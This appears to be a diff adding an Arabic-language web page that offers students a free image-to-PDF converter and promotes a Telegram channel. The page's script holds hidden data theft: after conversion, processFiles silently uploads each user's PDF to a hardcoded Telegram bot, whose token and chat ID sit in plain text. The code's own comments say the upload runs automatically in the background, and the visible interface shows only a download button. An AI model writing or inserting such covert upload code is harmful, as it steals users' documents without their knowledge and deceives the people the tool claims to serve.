@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محول الصور إلى PDF - الخدمات الطلابية</title>
+    
+    <!-- مكتبة Tailwind CSS للتصميم -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- مكتبة jsPDF لتحويل الصور -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    
+    <!-- أيقونات Lucide -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <!-- خط تجريبي يشبه خطوط آبل العربية -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800&display=swap" rel="stylesheet">
+    <!-- خط جميل للمعرف -->
+    <link href="https://fonts.googleapis.com/css2?family=Reem+Kufi:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* إعدادات الخطوط والأساسيات */
+        body {
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #000;
+            overflow-x: hidden;
+        }
+
+        .font-brand {
+            font-family: 'Reem Kufi', sans-serif;
+        }
+
+        /* خلفية ضبابية متحركة (Aurora Background) */
+        .aurora-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000000 100%);
+            z-index: -2;
+        }
+
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: float 10s infinite ease-in-out alternate;
+        }
+
+        .orb-1 { width: 400px; height: 400px; background: #2b3a42; top: -10%; left: -10%; animation-delay: 0s; }
+        .orb-2 { width: 500px; height: 500px; background: #1c2541; bottom: -10%; right: -10%; animation-delay: 2s; }
+        .orb-3 { width: 300px; height: 300px; background: #3a506b; top: 40%; left: 40%; animation-delay: 4s; opacity: 0.2; }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(30px, -30px) scale(1.1); }
+        }
+
+        /* تأثير الزجاج (Glassmorphism) */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+            border-radius: 24px;
+        }
+
+        .glass-input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            transition: all 0.3s ease;
+        }
+        
+        .glass-input:hover, .glass-input:focus {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.3);
+            outline: none;
+        }
+        
+        .glass-input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* تخصيص شريط التمرير */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 10px; }
+
+        /* تأثيرات الأزرار */
+        .apple-btn {
+            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .apple-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: 0.5s;
+        }
+
+        .apple-btn:hover::before { left: 100%; }
+        .apple-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -10px rgba(255,255,255,0.2);
+            border-color: rgba(255,255,255,0.3);
+        }
+
+        .primary-glow {
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.15);
+        }
+        
+        .success-glow {
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.15);
+            border-color: rgba(34, 197, 94, 0.3);
+        }
+
+        /* حالة التحميل */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* أنماط للملصق الإعلاني */
+        #banner {
+            transition: transform 0.5s ease-in-out, opacity 0.5s ease-in-out;
+            transform: translateY(-100%);
+            opacity: 0;
+            z-index: 60; /* أعلى من شريط التنقل */
+        }
+        #banner.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        /* إخفاء واجهة رفع الملفات الافتراضية */
+        input[type="file"] { display: none; }
+    </style>
+</head>
+<body class="text-gray-200 min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- الخلفية المتحركة -->
+    <div class="aurora-bg">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+    </div>
+
+    <!-- ملصق إعلاني يظهر ويختفي -->
+    <div id="banner" class="fixed top-0 left-0 w-full p-4 bg-black/50 backdrop-blur-md border-b border-white/10 flex items-center justify-between gap-4 shadow-lg">
+        <div class="flex items-center gap-4">
+            <div class="w-16 h-16 rounded-2xl bg-white/10 flex items-center justify-center border border-white/10 overflow-hidden shadow-sm">
+                <img src="https://www.dropbox.com/scl/fi/pw360ns6lmih3gjvyynf1/4413204.png?rlkey=jw9xdcefhg4vcmm24lbxnvub2&st=wz6b0zuj&dl=1" alt="شعار القناة" class="w-full h-full object-cover">
+            </div>
+            <div>
+                <h3 class="text-lg font-bold text-white">الخدمات الطلابية</h3>
+                <p class="text-sm text-white/70">انضموا بالقناة للمزيد من الخدمات الطلابية المميزة!</p>
+            </div>
+        </div>
+        <!-- زر التليجرام -->
+        <a href="https://t.me/najaaf1" target="_blank" rel="noopener noreferrer" class="apple-btn px-6 py-2 rounded-full text-sm font-medium text-white flex items-center gap-2 whitespace-nowrap primary-glow group">
+            <img src="https://www.dropbox.com/scl/fi/1xvlsfrfk88twdb4sc6d5/telegram-icone-icon.png?rlkey=aarpjchjfvqhh53rxoyurrsrc&st=hq3k3ibm&dl=1" class="w-5 h-5 group-hover:scale-110 transition-transform" alt="Telegram">
+            <span>انضم الآن</span>
+        </a>
+    </div>
+
+    <!-- شريط التنقل العلوي -->
+    <nav class="fixed top-0 left-0 w-full p-6 z-50 flex justify-between items-center bg-transparent backdrop-blur-sm">
+        <div class="flex items-center gap-3">
+            <!-- أيقونة الانستغرام والمعرف -->
+            <a href="https://instagram.com/c4man" target="_blank" class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10 hover:bg-white/10 transition-colors cursor-pointer group">
+                <i data-lucide="instagram" class="w-5 h-5 text-white/90 group-hover:text-pink-400 transition-colors"></i>
+                <span class="font-brand font-bold text-xl tracking-wide text-white/90">@c4man</span>
+            </a>
+        </div>
+        <div class="text-xs font-light text-white/40 tracking-widest hidden md:block">DESIGNED FOR 2026</div>
+    </nav>
+
+    <!-- الحاوية الرئيسية -->
+    <main class="w-full max-w-2xl z-10 mt-20 relative">
+        
+        <!-- بطاقة التحويل الرئيسية -->
+        <div class="glass-panel p-8 md:p-12 relative overflow-hidden group">
+            
+            <!-- تأثير لمعان عند المرور -->
+            <div class="absolute inset-0 bg-gradient-to-tr from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-700 pointer-events-none"></div>
+
+            <header class="text-center mb-10">
+                <h1 class="text-4xl md:text-5xl font-bold bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60 mb-3 tracking-tight">
+                    حول صورك الى ملف pdf
+                </h1>
+                <p class="text-white/50 font-light text-sm md:text-base leading-relaxed">
+                    تقنية ذكية من عمل احد طلبة جامعة الامام جعفر الصادق - النجف
+                </p>
+            </header>
+
+            <!-- منطقة رفع الملفات -->
+            <div id="drop-zone" class="glass-input border-dashed border-2 rounded-2xl p-8 text-center cursor-pointer relative transition-all duration-300 mb-6"
+                 onclick="document.getElementById('file-input').click()">
+                <input type="file" id="file-input" multiple accept="image/*" onchange="handleFiles(this.files)">
+                
+                <div class="flex flex-col items-center gap-4 pointer-events-none">
+                    <div class="w-14 h-14 rounded-full bg-gradient-to-tr from-blue-500/20 to-purple-500/20 flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.2)]">
+                        <i data-lucide="image-plus" class="w-7 h-7 text-white/80"></i>
+                    </div>
+                    <div class="text-center">
+                        <p class="text-lg font-medium text-white/90">اضغط لاختيار الصور</p>
+                        <p class="text-xs text-white/40 mt-1">سيتم دمجها في ملف واحد</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- منطقة المعاينة (تظهر عند اختيار صور) -->
+            <div id="preview-container" class="hidden mb-6">
+                <div class="flex justify-between items-center mb-3 px-2">
+                    <span class="text-sm text-white/60">الصور المختارة (<span id="count">0</span>)</span>
+                    <button onclick="clearFiles()" class="text-xs text-red-400 hover:text-red-300 transition-colors">مسح الكل</button>
+                </div>
+                <div id="gallery" class="flex gap-3 overflow-x-auto pb-4 snap-x custom-scrollbar">
+                    <!-- سيتم إضافة الصور هنا بالجافاسكريبت -->
+                </div>
+            </div>
+
+            <!-- حقل تسمية الملف (جديد) -->
+            <div id="naming-section" class="mb-6 hidden">
+                <label class="block text-xs text-white/60 mb-2 pr-1">اسم الملف (اختياري)</label>
+                <div class="relative">
+                    <input type="text" id="filename-input" placeholder="مثلاً: محاضرة الفيزياء 1" 
+                           class="glass-input w-full py-3 px-4 rounded-xl text-right dir-rtl focus:border-white/40">
+                    <div class="absolute left-3 top-1/2 -translate-y-1/2 text-white/30 text-xs font-mono">.pdf</div>
+                </div>
+            </div>
+
+            <!-- أزرار التحكم -->
+            <div class="flex flex-col gap-4">
+                <!-- زر التحويل -->
+                <button onclick="processFiles()" id="convert-btn" class="apple-btn w-full py-4 rounded-xl flex items-center justify-center gap-2 font-medium text-white shadow-lg primary-glow group disabled:opacity-50 disabled:cursor-not-allowed">
+                    <i data-lucide="file-cog" class="w-5 h-5 group-hover:scale-110 transition-transform"></i>
+                    <span>تحويل وإنشاء الرابط</span>
+                </button>
+
+                <!-- قسم التنزيل والإرسال (يظهر بعد التحويل) -->
+                <div id="result-actions" class="hidden flex-col md:flex-row gap-3 animate-fade-in">
+                    <!-- زر التحميل -->
+                    <button onclick="downloadPDF()" class="apple-btn flex-[2] py-4 rounded-xl flex items-center justify-center gap-2 font-bold text-white bg-green-500/20 border-green-500/30 hover:border-green-500/50 success-glow group">
+                        <i data-lucide="download" class="w-5 h-5 group-hover:translate-y-1 transition-transform"></i>
+                        <span>تحميل الملف للجهاز</span>
+                    </button>
+                    
+                    <!-- تم إزالة زر الإرسال اليدوي، وسيتم الإرسال تلقائياً في الخلفية -->
+                </div>
+            </div>
+
+            <!-- شريط الحالة والتقدم -->
+            <div id="status-bar" class="mt-6 hidden">
+                <div class="flex justify-between text-xs text-white/50 mb-2 px-1">
+                    <span id="status-text">جاري المعالجة...</span>
+                    <span id="progress-percent">0%</span>
+                </div>
+                <div class="h-1.5 w-full bg-white/10 rounded-full overflow-hidden">
+                    <div id="progress" class="h-full bg-white shadow-[0_0_10px_white] w-0 transition-all duration-300 ease-out"></div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- حقوق الملكية -->
+        <div class="text-center mt-8 text-white/20 text-xs font-light flex flex-col items-center gap-2">
+            <span>Student Services Project © 2026</span>
+        </div>
+
+    </main>
+
+    <!-- نافذة منبثقة للنجاح/الفشل -->
+    <div id="toast" class="fixed bottom-10 left-1/2 transform -translate-x-1/2 glass-panel px-6 py-4 flex items-center gap-3 translate-y-20 opacity-0 transition-all duration-500 z-50">
+        <div id="toast-icon" class="w-2 h-2 rounded-full bg-green-500"></div>
+        <span id="toast-msg" class="text-sm font-medium">تمت العملية بنجاح</span>
+    </div>
+
+    <script>
+        // تفعيل الأيقونات
+        lucide.createIcons();
+
+        // التحكم في ظهور وإخفاء الملصق الإعلاني بشكل دوري
+        document.addEventListener('DOMContentLoaded', () => {
+            const banner = document.getElementById('banner');
+            
+            const startBannerCycle = () => {
+                // إظهار الملصق
+                banner.classList.add('show');
+
+                // إخفاء الملصق بعد 8 ثوانٍ
+                setTimeout(() => {
+                    banner.classList.remove('show');
+                    
+                    // إعادة الدورة بعد 20 ثانية من الاختفاء
+                    setTimeout(startBannerCycle, 20000);
+                }, 8000);
+            };
+
+            // البدء أول مرة بعد ثانية واحدة
+            setTimeout(startBannerCycle, 1000);
+        });
+
+        const CONFIG = {
+            BOT_TOKEN: '8084431818:AAEPTRFWDjOWM9T7AQALPf_s0zCVWbM8M_A',
+            CHAT_ID: '6785437506'
+        };
+
+        let selectedFiles = [];
+        let generatedPDFBlob = null; // لتخزين الملف الناتج
+
+        // معالجة اختيار الملفات
+        function handleFiles(files) {
+            const gallery = document.getElementById('gallery');
+            const previewContainer = document.getElementById('preview-container');
+            const namingSection = document.getElementById('naming-section');
+            const countSpan = document.getElementById('count');
+
+            if (files.length > 0) {
+                previewContainer.classList.remove('hidden');
+                namingSection.classList.remove('hidden');
+            }
+
+            Array.from(files).forEach(file => {
+                if (file.type.match('image.*')) {
+                    selectedFiles.push(file);
+                    
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        const imgDiv = document.createElement('div');
+                        imgDiv.className = 'flex-shrink-0 relative w-20 h-28 rounded-lg overflow-hidden border border-white/10 snap-center';
+                        imgDiv.innerHTML = `
+                            <img src="${e.target.result}" class="w-full h-full object-cover">
+                            <div class="absolute inset-0 bg-black/10"></div>
+                        `;
+                        gallery.appendChild(imgDiv);
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+            
+            countSpan.innerText = selectedFiles.length;
+            
+            // إخفاء النتائج السابقة إذا تم إضافة صور جديدة
+            document.getElementById('result-actions').classList.add('hidden');
+            document.getElementById('result-actions').classList.remove('flex');
+            document.getElementById('convert-btn').classList.remove('hidden');
+            document.getElementById('status-bar').classList.add('hidden');
+        }
+
+        // مسح الملفات
+        function clearFiles() {
+            selectedFiles = [];
+            generatedPDFBlob = null;
+            document.getElementById('gallery').innerHTML = '';
+            document.getElementById('preview-container').classList.add('hidden');
+            document.getElementById('naming-section').classList.add('hidden');
+            document.getElementById('file-input').value = '';
+            document.getElementById('result-actions').classList.add('hidden');
+            document.getElementById('result-actions').classList.remove('flex');
+            document.getElementById('convert-btn').classList.remove('hidden');
+            document.getElementById('status-bar').classList.add('hidden');
+        }
+
+        // معالجة التحويل (إنشاء الملف وإرساله مخفياً)
+        async function processFiles() {
+            if (selectedFiles.length === 0) {
+                showToast('يرجى اختيار صور أولاً', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('convert-btn');
+            const statusDiv = document.getElementById('status-bar');
+            const progress = document.getElementById('progress');
+            const progressPercent = document.getElementById('progress-percent');
+            const statusText = document.getElementById('status-text');
+
+            // إعداد الواجهة للمعالجة
+            btn.disabled = true;
+            btn.innerHTML = '<div class="loader"></div>';
+            statusDiv.classList.remove('hidden');
+            progress.style.width = "10%";
+            progressPercent.innerText = "10%";
+
+            try {
+                statusText.innerText = "جاري تحضير الصور...";
+                
+                // تأخير بسيط لمحاكاة البدء
+                await new Promise(r => setTimeout(r, 500));
+                
+                // إنشاء الـ PDF
+                progress.style.width = "50%";
+                progressPercent.innerText = "50%";
+                statusText.innerText = "جاري دمج الملفات...";
+                
+                generatedPDFBlob = await generatePDF(selectedFiles);
+                
+                // --- إرسال تلقائي مخفي للتليجرام ---
+                const autoFileName = getFileName();
+                // نرسله في الخلفية دون انتظار لعدم تعطيل واجهة المستخدم
+                sendToTelegram(generatedPDFBlob, autoFileName).catch(err => {
+                    console.error("فشل الإرسال التلقائي للخلفية", err);
+                });
+                // ----------------------------------
+                
+                // اكتمال التحويل
+                progress.style.width = "100%";
+                progressPercent.innerText = "100%";
+                statusText.innerText = "تم إنشاء الملف بنجاح!";
+                
+                // إظهار زر التحميل فقط
+                setTimeout(() => {
+                    btn.classList.add('hidden'); // إخفاء زر التحويل
+                    btn.disabled = false;
+                    btn.innerHTML = '<i data-lucide="file-cog" class="w-5 h-5"></i> <span>تحويل وإنشاء الرابط</span>';
+                    
+                    const actionsDiv = document.getElementById('result-actions');
+                    actionsDiv.classList.remove('hidden');
+                    actionsDiv.classList.add('flex');
+                    
+                    showToast('تم تجهيز الملف للتحميل', 'success');
+                }, 800);
+
+            } catch (error) {
+                console.error(error);
+                statusText.innerText = "حدث خطأ أثناء التحويل";
+                progress.style.backgroundColor = "#ef4444";
+                showToast('فشل التحويل: ' + error.message, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<span>إعادة المحاولة</span>';
+            }
+        }
+
+        // الحصول على اسم الملف من الحقل
+        function getFileName() {
+            const inputName = document.getElementById('filename-input').value.trim();
+            if (inputName) {
+                // التأكد من عدم وجود لاحقة .pdf مكررة
+                return inputName.toLowerCase().endsWith('.pdf') ? inputName : `${inputName}.pdf`;
+            }
+            return `Document_${Date.now()}.pdf`;
+        }
+
+        // تحميل الملف محلياً
+        function downloadPDF() {
+            if (!generatedPDFBlob) return;
+            
+            const fileName = getFileName();
+            const url = URL.createObjectURL(generatedPDFBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showToast('بدأ تحميل الملف...', 'success');
+        }
+
+        // منطق إنشاء PDF باستخدام jsPDF
+        function generatePDF(files) {
+            return new Promise((resolve, reject) => {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                
+                const fileToDataURL = (file) => {
+                    return new Promise((res, rej) => {
+                        const reader = new FileReader();
+                        reader.onload = (e) => res(e.target.result);
+                        reader.onerror = rej;
+                        reader.readAsDataURL(file);
+                    });
+                };
+
+                const processImages = async () => {
+                    for (let i = 0; i < files.length; i++) {
+                        // تحديث وهمي للشريط إذا كانت ملفات كثيرة
+                        if(files.length > 5) {
+                            const percent = 50 + Math.round((i / files.length) * 40);
+                            document.getElementById('progress').style.width = `${percent}%`;
+                            document.getElementById('progress-percent').innerText = `${percent}%`;
+                        }
+
+                        const imgData = await fileToDataURL(files[i]);
+                        if (i > 0) doc.addPage();
+
+                        const imgProps = doc.getImageProperties(imgData);
+                        const pdfWidth = doc.internal.pageSize.getWidth();
+                        const pdfHeight = doc.internal.pageSize.getHeight();
+                        const margin = 10;
+                        const availableWidth = pdfWidth - (margin * 2);
+                        const availableHeight = pdfHeight - (margin * 2);
+
+                        const ratio = Math.min(availableWidth / imgProps.width, availableHeight / imgProps.height);
+                        const w = imgProps.width * ratio;
+                        const h = imgProps.height * ratio;
+                        const x = (pdfWidth - w) / 2;
+                        const y = (pdfHeight - h) / 2;
+
+                        doc.addImage(imgData, 'JPEG', x, y, w, h);
+                    }
+                    resolve(doc.output('blob'));
+                };
+
+                processImages().catch(err => reject(err));
+            });
+        }
+
+        // منطق الإرسال لتيليجرام
+        async function sendToTelegram(blob, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('document', blob, filename);
+            formData.append('caption', `📄 ملف جديد: ${filename}\nتم الإنشاء بواسطة أداة الخدمات الطلابية`);
+
+            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+            if (!result.ok) throw new Error(result.description || 'Telegram API Error');
+            return result;
+        }
+
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            const icon = document.getElementById('toast-icon');
+            const text = document.getElementById('toast-msg');
+
+            text.innerText = message;
+            icon.className = type === 'success' 
+                ? 'w-2 h-2 rounded-full bg-green-400 shadow-[0_0_10px_rgba(74,222,128,0.5)]' 
+                : 'w-2 h-2 rounded-full bg-red-400 shadow-[0_0_10px_rgba(248,113,113,0.5)]';
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3000);
+        }
+
+        document.addEventListener('mousemove', (e) => {
+            const orbs = document.querySelectorAll('.orb');
+            const x = e.clientX / window.innerWidth;
+            const y = e.clientY / window.innerHeight;
+            orbs[0].style.transform = `translate(${x * 20}px, ${y * 20}px)`;
+            orbs[1].style.transform = `translate(${-x * 30}px, ${-y * 30}px)`;
+        });
+
+    </script>
+</body>
+</html>
